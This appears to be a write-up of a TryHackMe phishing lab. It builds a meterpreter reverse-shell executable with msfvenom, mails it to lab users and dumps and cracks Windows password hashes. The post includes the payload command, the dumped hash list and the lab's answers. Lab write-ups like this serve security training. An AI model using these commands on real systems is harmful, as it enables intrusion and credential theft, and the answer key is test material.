# Gone Phishing

Although I skimmed over the first two room of the five part series on Phishing on THM it seems that this lab has cool emulate-a-regular-user-bot that downloads malicious software for us. 

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o NotAShell.exe
```

While in the background I run brutespray, just like *always recon in the background* you there is also password spraying or sqlmap in the background. Making a payload with msfvenom:  
![gp-payload](Screenshots/gp-payload.png)

Setting a listener in metasploit multi/handler:  

![gp-listener](Screenshots/gp-mutlihandler.png)

Before starting to copy and paste "compose the correct email for the bot to download our reverse shell", quick script to format the `To:`  field of the phishing email. Using some bash, to awk for the 4th field of contacts.txt which is just the address book from the thbguest email, printing out all the email address then pipe to translate with the substitution flag to replace newline chars with a comma and whitespace:
```bash
awk '{print $4}' contacts.txt | tr -s "\n" ", "
```

The result:
![gp-awking](Screenshots/gp-bash-magic.png)

Now to construct the rest of the email:

![gp-bigphish](Screenshots/gp-big-phish.png)

Attach before sending:

![gp-attach](Screenshots/gp-attachit.png)

And then..
![gp-bigcatchy](Screenshots/gp-thecatch.png)

Instantly loaded kiwi and then enumerating the box
![gp-landed](Screenshots/gp-ws-is-online.png)

Root flag and use of the search just for showcasing and timing how long search takes. One thing that I have discover going back to Windows as a hacker is that searching the filesystem is mindblobblingly slow.
![gp-landed](Screenshots/ws-root-flag.png)
![gp-humpty](Screenshots/gp-user-flag.png)
Then I migrated process to one owned by the NT AUTHORITY and dumped the hashes:

```toggle
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BlaireJ:1001:aad3b435b51404eeaad3b435b51404ee:c374ecb7c2ccac1df3a82bce4f80bb5b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1002:aad3b435b51404eeaad3b435b51404ee:50527b4bfe81a64edf00e6b05c26c195:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0a06b1381599f2c8c8bfdbee39edbe1c:::
```

Then I cracked the hashes after first using some more awk-some awk command with -F for field seperator ":" which select fields or sections of text by a demiliter or symbol that seperates the fields:
```bash
cat hashesWS1 | awk -F : '{print $4}' > WS1hashes
```
![gp-hashcrackin](Screenshots/pg-hashcrackin.png)

## Answers 
What User was compromised via Phishing?
```{toggle}
BlaireJ
```
What Machine was compromised during Phishing?
```{toggle}
 THROWBACK-WS01
```